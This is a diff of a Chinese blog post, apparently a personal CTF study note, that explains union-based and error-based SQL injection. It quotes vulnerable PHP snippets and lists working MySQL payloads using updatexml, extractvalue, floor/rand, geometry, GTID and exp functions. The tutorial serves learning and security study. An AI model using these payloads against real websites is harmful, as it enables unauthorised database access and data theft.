@@ -36,7 +36,7 @@
         <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
             <span>📅 发布: 2025-12-11</span>
             <span style="margin: 0 15px;">|</span>
-            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-21</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-22</span>
             
             
              <span style="margin: 0 15px;">|</span>
@@ -50,8 +50,8 @@
 <p>SQL 注入就是指 Web 应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
 <p>这边是一个非常官方性质的解释，按我自己个人的理解，sql注入就是将我们想要执行的操作通过构造sql的形式，绕过web的过滤或者识别，最终完成的句子。</p>
 <p>sql，我个人喜欢的就是分为三种。</p>
-<h2 id="一-回显型的sql注入"><a href="#一-回显型的sql注入" class="headerlink" title="#一.回显型的sql注入"></a><strong>#一.回显型的sql注入</strong></h2><p>这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。</p>
-<h3 id="union-注入-联合注入-："><a href="#union-注入-联合注入-：" class="headerlink" title="union 注入(联合注入)："></a>union 注入(联合注入)：</h3><p><code>id=-1 UNION SELECT 1, user(), 3(数字型)</code></p>
+<h2 id="一-回显型的sql注入"><a href="#一-回显型的sql注入" class="headerlink" title="一.回显型的sql注入"></a><strong>一.回显型的sql注入</strong></h2><p>这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。</p>
+<h1 id="union-注入-联合注入-："><a href="#union-注入-联合注入-：" class="headerlink" title="#union 注入(联合注入)："></a>#union 注入(联合注入)：</h1><h2 id="数字型："><a href="#数字型：" class="headerlink" title="##数字型："></a>##数字型：</h2><p><code>id=-1 UNION SELECT 1, user(), 3(数字型)</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：这里的 $id 两边没有单引号</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>拼接后得到 <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, user(), 3</code></p>
@@ -71,7 +71,7 @@
 <li><code>WHERE table_schema=database()</code>: 加这个条件是为了过滤，只筛选出当前网站数据库里的表名，防止把其他的都查出来。</li>
 <li><code>group_concat(table_name)</code>: 这一点至关重要。因为网页的回显位通常只有一行，而表名可能有好几个。如果直接查，只能显示第一个。<code>group_concat</code> 的作用是将多行查询结果合并成一个字符串（用逗号分隔），全部打包显示出来。</li>
 </ol>
-<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h3 id="第一阶段：侦察-Reconnaissance"><a href="#第一阶段：侦察-Reconnaissance" class="headerlink" title="第一阶段：侦察 (Reconnaissance)\"></a>第一阶段：侦察 (Reconnaissance)\</h3><h4 id="Step-1-确认注入点"><a href="#Step-1-确认注入点" class="headerlink" title="Step 1: 确认注入点"></a>Step 1: 确认注入点</h4><p><strong>目标：</strong> 确定 <code>SELECT *</code> 到底代表几列，为后面的 <code>UNION</code> 做准备。 <strong>核心命令：</strong> <code>ORDER BY</code></p>
+<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h3 id="第一阶段：侦察"><a href="#第一阶段：侦察" class="headerlink" title="第一阶段：侦察"></a>第一阶段：侦察</h3><h4 id="Step-1-确认注入点"><a href="#Step-1-确认注入点" class="headerlink" title="Step 1: 确认注入点"></a>Step 1: 确认注入点</h4><p><strong>目标：</strong> 确定 <code>SELECT *</code> 到底代表几列，为后面的 <code>UNION</code> 做准备。 <strong>核心命令：</strong> <code>ORDER BY</code></p>
 <ol>
 <li><p><strong>验证数字型：</strong></p>
 <ul>
@@ -115,7 +115,7 @@
 
 <p><strong>结果：</strong> <code>admin~123456, root~flag{congratulations}</code></p>
 <hr>
-<p>除了数字型的，还有字符型的。</p>
+<h2 id="字符型："><a href="#字符型：" class="headerlink" title="##字符型："></a>##字符型：</h2><p>除了数字型的，还有字符型的。</p>
 <p>两位的区别就是在于，获取参数的地方，字符型的，参数加上了单引号或双引号。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">假设后端代码是这样的：</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：变量 $id 被单引号包裹</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br></pre></td></tr></table></figure>
 
@@ -132,80 +132,179 @@
 <p>其实%23和#也能起到跟–+起到相同的作用。</p>
 <h3 id="小总结：-1"><a href="#小总结：-1" class="headerlink" title="小总结："></a>小总结：</h3><p>字符型的大概流程其实跟数字型的差不多，只是多了一步逃逸。</p>
 <h4 id="Step-1-确认是字符型-判断闭合符"><a href="#Step-1-确认是字符型-判断闭合符" class="headerlink" title="Step 1: 确认是字符型 &amp; 判断闭合符"></a>Step 1: 确认是字符型 &amp; 判断闭合符</h4><p><strong>目标：</strong> 搞清楚程序员是用单引号 <code>&#39;</code> 还是双引号 <code>&quot;</code> 包裹参数的。</p>
+<p><strong>测试 1：</strong> 输入 <code>id=1&#39;</code> (加个单引号)。				<strong>现象：</strong> 页面报错 (Syntax error)。</p>
+<p><strong>推断：</strong> 很有可能是单引号注入。因为你输入的 <code>&#39;</code> 打破了原本的成对引号，变成了 3 个引号。</p>
+<p><strong>测试 2：</strong> 输入 <code>id=1&#39; --+</code> (加单引号并注释)。			<strong>现象：</strong> 页面恢复正常。</p>
+<p><strong>结论：</strong> 确认是 <strong>单引号字符型注入</strong>。</p>
+<h4 id="Step-2-猜列数"><a href="#Step-2-猜列数" class="headerlink" title="Step 2: 猜列数"></a>Step 2: 猜列数</h4><p><strong>注意：</strong> 这里必须带上闭合符和注释符！</p>
 <ul>
-<li><strong>测试 1：</strong> 输入 <code>id=1&#39;</code> (加个单引号)<ul>
-<li><strong>现象：</strong> 页面报错 (Syntax error)。</li>
-<li><strong>推断：</strong> 很有可能是单引号注入。因为你输入的 <code>&#39;</code> 打破了原本的成对引号，变成了 3 个引号。</li>
-</ul>
-</li>
-<li><strong>测试 2：</strong> 输入 <code>id=1&#39; --+</code> (加单引号并注释)<ul>
-<li><strong>现象：</strong> 页面恢复正常。</li>
-<li><strong>结论：</strong> 确认是 <strong>单引号字符型注入</strong>。</li>
-</ul>
-</li>
-</ul>
-<p><em>(注：如果单引号不报错，试双引号 <code>id=1&quot;</code>，原理一样。)</em></p>
-<h4 id="Step-2-猜列数-ORDER-BY"><a href="#Step-2-猜列数-ORDER-BY" class="headerlink" title="Step 2: 猜列数 (ORDER BY)"></a>Step 2: 猜列数 (ORDER BY)</h4><p><strong>注意：</strong> 这里必须带上闭合符和注释符！</p>
-<ul>
-<li><strong>Payload:</strong> <code>id=1&#39; ORDER BY 3 --+</code><ul>
+<li><code>id=1&#39; ORDER BY 3 --+</code><ul>
 <li><strong>拼接后：</strong> <code>... WHERE id = &#39;1&#39; ORDER BY 3 --+&#39;</code></li>
 <li><strong>原理解析：</strong> 如果不加 <code>&#39;</code> 和 <code>--+</code>，<code>ORDER BY</code> 就会被当成 ID 的一部分，导致报错。</li>
 </ul>
 </li>
 </ul>
-<h4 id="Step-3-找回显位-UNION-SELECT"><a href="#Step-3-找回显位-UNION-SELECT" class="headerlink" title="Step 3: 找回显位 (UNION SELECT)"></a>Step 3: 找回显位 (UNION SELECT)</h4><ul>
-<li><strong>Payload:</strong> <code>id=-1&#39; UNION SELECT 1, 2, 3 --+</code><ul>
+<h4 id="Step-3-找回显位"><a href="#Step-3-找回显位" class="headerlink" title="Step 3: 找回显位"></a>Step 3: 找回显位</h4><ul>
+<li><code>id=-1&#39; UNION SELECT 1, 2, 3 --+</code><ul>
 <li><strong>注意：</strong> 同样要有 <code>&#39;</code> 和 <code>--+</code>。</li>
 </ul>
 </li>
 </ul>
 <h4 id="Step-4-5-6-爆数据"><a href="#Step-4-5-6-爆数据" class="headerlink" title="Step 4, 5, 6: 爆数据"></a>Step 4, 5, 6: 爆数据</h4><p>和数字型完全一样，只是每次都要记得在最前面加 <code>&#39;</code>，最后面加 <code>--+</code>。</p>
-<ul>
-<li><p>Payload 示例：</p>
-<p>id&#x3D;-1’ UNION SELECT 1, database(), 3 –+</p>
-</li>
-</ul>
+<p><code>id=-1&#39; UNION SELECT 1, database(), 3 --+</code>。</p>
 <hr>
-<h3 id="四、-常见的注释符-Cheat-Sheet"><a href="#四、-常见的注释符-Cheat-Sheet" class="headerlink" title="四、 常见的注释符 (Cheat Sheet)"></a>四、 常见的注释符 (Cheat Sheet)</h3><p>在 URL 或者输入框里，你可能会用到不同的注释符，记一下：</p>
-<ol>
-<li><strong><code>--+</code></strong> (最常用)<ul>
-<li>这是 <code>-- </code> (横杠横杠空格) 的 URL 编码形式。</li>
-</ul>
-</li>
-<li><strong><code>%23</code></strong> (常用)<ul>
-<li>这是 <code>#</code> (井号) 的 URL 编码。</li>
-<li><em>注意：直接输入 <code>#</code> 可能会被浏览器当成锚点截断，传不到服务器，所以要填 <code>%23</code>。</em></li>
-</ul>
-</li>
-<li><strong><code>#</code></strong> (POST 注入常用)<ul>
-<li>如果是输入框直接提交（不是在 URL 里），可以直接用 <code>#</code>。</li>
-</ul>
-</li>
-</ol>
-<h3 id="总结一张对比图"><a href="#总结一张对比图" class="headerlink" title="总结一张对比图"></a>总结一张对比图</h3><table>
+<h1 id="报错注入："><a href="#报错注入：" class="headerlink" title="#报错注入："></a>#报错注入：</h1><p>这同样也是一种存在回显的sql注入，与上面联合注入不同的是，报错注入是因为服务器的源码将union禁止了，正常的显示方式变了。</p>
+<p>变成类似这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">    // 把数据库的错误信息直接打印到了网页上</span><br><span class="line">    echo mysql_error(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将报错的信息直接打印在了网页上。</p>
+<p>这边做一个简单的比较：</p>
+<table>
 <thead>
 <tr>
-<th><strong>注入类型</strong></th>
-<th><strong>原始代码 (模拟)</strong></th>
-<th><strong>你的核心 Payload 结构</strong></th>
-<th><strong>关键动作</strong></th>
+<th><strong>特性</strong></th>
+<th>**联合注入 **</th>
+<th>**报错注入 **</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>数字型</strong></td>
-<td><code>id = $id</code></td>
-<td><code>id=-1 UNION ...</code></td>
-<td>直接拼接，简单粗暴</td>
+<td><strong>逻辑本质</strong></td>
+<td><strong>拼凑</strong></td>
+<td><strong>报错</strong></td>
 </tr>
 <tr>
-<td><strong>字符型</strong></td>
-<td><code>id = &#39;$id&#39;</code></td>
-<td><code>id=-1&#39; UNION ... --+</code></td>
-<td><strong>闭合</strong>左引号，<strong>注释</strong>右引号</td>
+<td><strong>运作方式</strong></td>
+<td>利用 <code>UNION</code> 将原本查询的结果和恶意查询的结果拼接在一起。</td>
+<td>利用特殊函数的逻辑，在抛出系统错误时，强制包含查询结果。</td>
+</tr>
+<tr>
+<td><strong>数据通道</strong></td>
+<td><strong>正常的数据展示通道</strong> (网页的正文、标题等)。</td>
+<td><strong>报错信息提示通道</strong> (网页的 Debug 信息、警告框)。</td>
+</tr>
+<tr>
+<td><strong>SQL 状态</strong></td>
+<td>SQL 语句必须语法正确，逻辑通顺。</td>
+<td>构造的 SQL 语句在逻辑上必须是错误的（才能触发报错）。</td>
 </tr>
 </tbody></table>
-<p>现在你理解为什么我说字符型注入就像是“三明治”了吗？</p>
-<p>左边一片面包（’），右边一片面包（–+），中间夹着你的攻击代码（UNION）。</p>
+<p>相比来看，报错注入需要的步骤更简单，但报错注入还是存在弊端的，因为报错内容是有限制的，如果报错信息太长了，那么有可能会将flag切断。</p>
+<p>这个时候就需要 用<code>substr()</code> 或 <code>substring()</code>函数将报错信息一段一段的切开来看。</p>
+<p>通常来看，报错注入利用的是 MySQL 中最经典的 XML 处理函数。它们本意是用来查询 XML 数据的，但如果 XPath 格式写错了，它们会报错并把错误内容显示出来。</p>
+<p>这边引用之前看到的一篇文章。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2160400">https://cloud.tencent.com/developer/article/2160400</a></p>
+</blockquote>
+<p>常用的报错函数：</p>
+<p><code>updatexml()</code> </p>
+<p><strong>函数原型：</strong> <code>updatexml(XML_document, XPath_string, new_value)</code></p>
+<ol>
+<li>**<code>XML_document</code> **: 也就是你要修改的那段 XML 内容（比如 <code>&lt;book&gt;&lt;title&gt;A&lt;/title&gt;&lt;/book&gt;</code>）。</li>
+<li>**<code>XPath_string</code> **: 类似于文件路径，告诉数据库你要修改哪一部分（比如 <code>/book/title</code>）。</li>
+<li><strong><code>new_value</code></strong> : 你要把那部分内容改成什么（比如 <code>B</code>）。</li>
+</ol>
+<p><strong>正常使用时：</strong> 数据库会根据你给的第 2 个参数，去找到第 1 个参数里的对应位置，用第 3 个参数替换掉。</p>
+<p>这原本就是一个处理xml数据的函数。</p>
+<p>XML数据：</p>
+<school>
+    <student>
+        <id>101</id>
+        <name>张三</name>
+        <score>95</score>
+    </student>
+    <student>
+        <id>102</id>
+        <name>李四</name>
+        <score>88</score>
+    </student>
+</school> 
+
+<p>看起来很像html。</p>
+<p>举个例子，就以上面的XML数据为源码，</p>
+<p><code>updatexml(xml_data,&#39;/school/student[1]/score&#39;,&#39;&lt;score&gt;100&lt;/score&gt;&#39;)</code></p>
+<p>使用这个函数，在xml文章中找到第一个student的分数部分，将其改为100。</p>
+<p><strong>而在报错注入中，我们的使用就不是这样了：</strong></p>
+<p><code>updatexml(1, concat(0x7e, (select user()), 0x7e), 1)</code></p>
+<p><strong>因为存在两个机制：</strong></p>
+<p>**机制 A：**MySQL 的报错机制 <code>updatexml</code> 的第二个参数要求必须是合法的 XPath 格式（例如 <code>/root/node</code>）。 如果你传入一个包含特殊符号（如波浪号 <code>~</code>）的字符串，MySQL 无法解析它，就会报错。 最关键的是：MySQL 会在报错信息里，把这个“错误的字符串”完整地打印出来！</p>
+<p>**机制 B：**SQL 的执行顺序 SQL 语句在执行函数时，会先计算参数里的子查询，然后再执行函数本身。</p>
+<p>所以在我们的报错注入的例子中，数据库会先执行 <code>select user()), 0x7e)</code> 去把数据库当前的账号打印出来，类似<code>root@localhost</code> ，<code>0x7e</code> 是波浪号的16进制，在这里的作用是拼接内容，变成 <code>&#39;~root@localhost~&#39;</code> 而在函数 <code>updatexml()</code> 中，因为第二个的参数必须为有效的 XPath 路径，而 <code>&#39;~root@localhost~&#39;</code> 不是有效路径，因此数据库就会报错，将当前账号的信息以报错的内容打印在网页上。</p>
+<p>如果不加波浪号，有可能会因为格式合法，导致数据库没有报错，从而看不见我们要的信息。</p>
+<p>以上就是简单的报错注入的例子。</p>
+<p>当然了，报错注入利用的函数还有很多，有可能因为题目不同的黑名单，导致 <code>updatexml()</code> 这个函数用不了，这边简单记录几个其他函数以及它们的用法，更具体的我会在开一个文章写。</p>
+<hr>
+<h3 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1. extractvalue()"></a>1. <code>extractvalue()</code></h3><p>这是最接近 <code>updatexml()</code> 的替代品，原理完全相同（都是 XPath 语法错误）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-floor-rand-group-by"><a href="#2-floor-rand-group-by" class="headerlink" title="2. floor() + rand() + group by"></a>2. <code>floor()</code> + <code>rand()</code> + <code>group by</code></h3><p>这是最经典的报错注入方式，通杀 MySQL 5.x 到 8.x 版本。利用 <code>group by</code> 在临时表插入数据时的主键冲突（Duplicate entry）报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND (SELECT 1 FROM (SELECT count(*), concat(user(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-几何函数报错"><a href="#3-几何函数报错" class="headerlink" title="3. 几何函数报错"></a>3. 几何函数报错</h3><p>在较新的 MySQL 版本（尤其是 5.7 和 8.0）中，引入了很多处理几何数据的函数。如果传入非法的格式，它们也会报错并回显数据。</p>
+<h4 id="A-ST-LatFromGeoHash"><a href="#A-ST-LatFromGeoHash" class="headerlink" title="A. ST_LatFromGeoHash()"></a>A. <code>ST_LatFromGeoHash()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND ST_LatFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+<h4 id="B-ST-LongFromGeoHash"><a href="#B-ST-LongFromGeoHash" class="headerlink" title="B. ST_LongFromGeoHash()"></a>B. <code>ST_LongFromGeoHash()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND ST_LongFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+<h4 id="C-ST-PointFromGeoHash"><a href="#C-ST-PointFromGeoHash" class="headerlink" title="C. ST_PointFromGeoHash()"></a>C. <code>ST_PointFromGeoHash()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND ST_PointFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-GTID-函数报错"><a href="#4-GTID-函数报错" class="headerlink" title="4. GTID 函数报错"></a>4. GTID 函数报错</h3><p>利用全局事务标识符（GTID）相关函数进行报错。</p>
+<h4 id="A-GTID-SUBSET"><a href="#A-GTID-SUBSET" class="headerlink" title="A. GTID_SUBSET()"></a>A. <code>GTID_SUBSET()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND GTID_SUBSET(concat(0x7e, (SELECT user()), 0x7e), 1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="B-GTID-SUBTRACT"><a href="#B-GTID-SUBTRACT" class="headerlink" title="B. GTID_SUBTRACT()"></a>B. <code>GTID_SUBTRACT()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND GTID_SUBTRACT(concat(0x7e, (SELECT user()), 0x7e), 1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-数学-溢出报错"><a href="#5-数学-溢出报错" class="headerlink" title="5. 数学&#x2F;溢出报错"></a>5. 数学&#x2F;溢出报错</h3><p>利用数学指数函数 <code>exp()</code> 产生双精度浮点数溢出错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND exp(~(SELECT * FROM (SELECT user()) a))</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th><strong>函数&#x2F;方法</strong></th>
+<th><strong>长度限制</strong></th>
+<th><strong>MySQL 版本</strong></th>
+<th><strong>特点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>updatexml</strong></td>
+<td>32 字符</td>
+<td>全版本</td>
+<td>最常用，但有长度限制</td>
+</tr>
+<tr>
+<td><strong>extractvalue</strong></td>
+<td>32 字符</td>
+<td>全版本</td>
+<td>updatexml 的完美替代</td>
+</tr>
+<tr>
+<td><strong>floor + group by</strong></td>
+<td><strong>无限制</strong></td>
+<td>全版本</td>
+<td>适合获取长数据，Payload 较繁琐</td>
+</tr>
+<tr>
+<td><strong>ST_LatFromGeoHash</strong></td>
+<td>32 字符</td>
+<td>5.7+</td>
+<td>适合绕过对 “xml” 的过滤</td>
+</tr>
+<tr>
+<td><strong>GTID_SUBSET</strong></td>
+<td>32 字符</td>
+<td>5.7+</td>
+<td>另一种绕过思路</td>
+</tr>
+</tbody></table>
+<p>当然了，报错注入不可能只有这么点，具体情况具体分析。</p>
 <hr>
 <ul>
 <li>版权声明：本文由白白毛毛创作，转载请注明出处。</li>
@@ -217,6 +316,6 @@
 
 </div>
 
-<script src="/js/main.js"></script>
+<script src="/js/main.js?v=1766495739507"></script>
 </body>
 </html>
